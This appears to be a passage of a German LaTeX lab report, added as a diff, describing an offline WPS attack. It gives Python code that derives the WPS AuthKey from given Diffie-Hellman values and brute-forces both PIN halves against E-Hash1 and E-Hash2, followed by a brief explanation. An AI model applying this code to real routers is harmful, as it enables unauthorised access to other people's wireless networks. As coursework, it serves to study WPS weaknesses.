@@ -1,0 +1,49 @@
+\section{WPS}
+Im Folgenden sollten wir einen WPS-Offline-Angriff durchführen und den gegebenen Code-Snippet so erweitern, dass er funktioniert.\\
+Folgend ist der Ausschnitt zu betrachten mit dem wir zum Ziel gekommen sind.
+\begin{verbatim}
+EHASH1 = binascii.unhexlify('C5FB...')
+EHASH2 = binascii.unhexlify('33D3...')
+ENonce = binascii.unhexlify('AB456D913C0BFC13CFA2F9F4F1ABD893')
+RNonce = binascii.unhexlify('CBA417007AD25F922ED764B27E790E8B')
+PK_E = binascii.unhexlify('86DE...')
+PK_R = binascii.unhexlify('4622...')
+pubkey_registrar = int("4622...",16)
+secret_number = 1631...
+shared_key = bignum_pack(pow(pubkey_registrar, secret_number, prime_int), 192)
+DHKey_berechnen = hashlib.sha256(shared_key).digest()
+DHKey=binascii.unhexlify('6d32...')
+
+# Check ob Berechnung genauso wie gegebener DH-KEy
+if(DHKey_berechnen==DHKey):
+    print("DHKey_berechnung erfolgreich")
+
+MAC = b"02:00:2e:a9:55:32"
+# Schlüsselberechnung
+KDK = hmac.new(DHKey, ENonce + MAC + RNonce, hashlib.sha256).digest()
+AuthKey, KeyWrapKey, EMSK = kdf(KDK, 'Wi-Fi Easy and Secure Key Derivation'.encode('utf-8'), [256, 128, 256])
+
+def brute_force1():
+        for i in range(10000):
+            pin1 = f"{i:04d}".encode()
+            psk1 = hmac.new(AuthKey, pin1, hashlib.sha256).digest()[:16]
+
+            test_EHash = hmac.new(AuthKey, b'\x00' * 16 + psk1 + PK_E + PK_R, hashlib.sha256).digest()
+
+            if test_EHash == EHASH1:
+                return f"GEFUNDEN: {i:04d}"
+        return "Kein Treffer"
+
+      
+def brute_force2():
+    for i in range(10000):
+        pin2 = f"{i:04d}".encode()
+        psk2 = hmac.new(AuthKey, pin2, hashlib.sha256).digest()[:16]
+
+        test_EHash = hmac.new(AuthKey, b'\x00' * 16 + psk2 + PK_E + PK_R, hashlib.sha256).digest()
+
+        if test_EHash == EHASH2:
+            return f"GEFUNDEN: {i:04d}"
+    return "Kein Treffer"
+\end{verbatim}
+Mit den gegebenen Werten haben wir also den Auth-Key berechnet und anschließend mit Brute-Force alle Passwortoptionen getestet. Dort berechnen wir den PSK mit unserem geratenen Passwort und dann den Hash, sodass wir diesen mit dem Ziel-Hash vergleichen können.
